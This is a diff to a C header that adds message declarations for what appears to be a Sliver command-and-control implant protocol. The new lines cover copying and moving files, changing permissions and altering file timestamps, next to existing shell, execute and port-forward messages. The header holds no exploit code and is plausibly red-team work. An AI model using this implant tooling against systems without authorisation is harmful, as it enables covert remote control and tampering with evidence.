@@ -167,6 +167,22 @@ int sliver_env_encode(sliver_buf_t *out, const sliver_env_pair_t *vars, size_t c
 /* CurrentTokenOwner{Output=1, Response=9}. */
 int sliver_current_token_owner_encode(sliver_buf_t *out, const char *who);
 
+/* --- Cp / Mv / Chmod / Chtimes ----------------------------------------- */
+/* CpReq/MvReq{Src=1, Dst=2}. */
+int sliver_src_dst_decode(const void *data, size_t len, char *src, size_t src_cap, char *dst,
+                          size_t dst_cap);
+/* Cp{Src=1,Dst=2,BytesWritten=3,Response=9}. */
+int sliver_cp_encode(sliver_buf_t *out, const char *src, const char *dst, int64_t written,
+                     const char *err);
+/* Mv{Src=1,Dst=2,Response=9}. */
+int sliver_mv_encode(sliver_buf_t *out, const char *src, const char *dst, const char *err);
+/* ChmodReq{Path=1,FileMode=2,Recursive=3}. */
+int sliver_chmod_req_decode(const void *data, size_t len, char *path, size_t path_cap,
+                            char *mode, size_t mode_cap, int *recursive);
+/* ChtimesReq{Path=1,ATime=2,MTime=3}. */
+int sliver_chtimes_req_decode(const void *data, size_t len, char *path, size_t path_cap,
+                              int64_t *atime, int64_t *mtime);
+
 /* --- Download / Upload -------------------------------------------------- */
 #define SLIVER_DOWNLOAD_CHUNK (64 * 1024)
 
@@ -283,6 +299,14 @@ int sliver_execute_encode(sliver_buf_t *out, uint32_t status, const void *stdout
 #define SLIVER_MSG_TUNNEL_CLOSE 23u
 #define SLIVER_MSG_SHELL_RESIZE_REQ 135u
 #define SLIVER_MSG_CURRENT_TOKEN_OWNER_REQ 100u
+#define SLIVER_MSG_MV_REQ 98u
+#define SLIVER_MSG_MV 99u
+#define SLIVER_MSG_CP_REQ 127u
+#define SLIVER_MSG_CP 128u
+#define SLIVER_MSG_CHMOD_REQ 109u
+#define SLIVER_MSG_CHMOD 110u
+#define SLIVER_MSG_CHTIMES_REQ 113u
+#define SLIVER_MSG_CHTIMES 114u
 #define SLIVER_MSG_CURRENT_TOKEN_OWNER 101u
 #define SLIVER_MSG_PORTFWD_REQ 80u
 #define SLIVER_MSG_PORTFWD 81u
@@ -294,6 +318,7 @@ int sliver_execute_encode(sliver_buf_t *out, uint32_t status, const void *stdout
 #endif
 
 #endif /* SLIVER_PROTO_H */
+
 
 
 
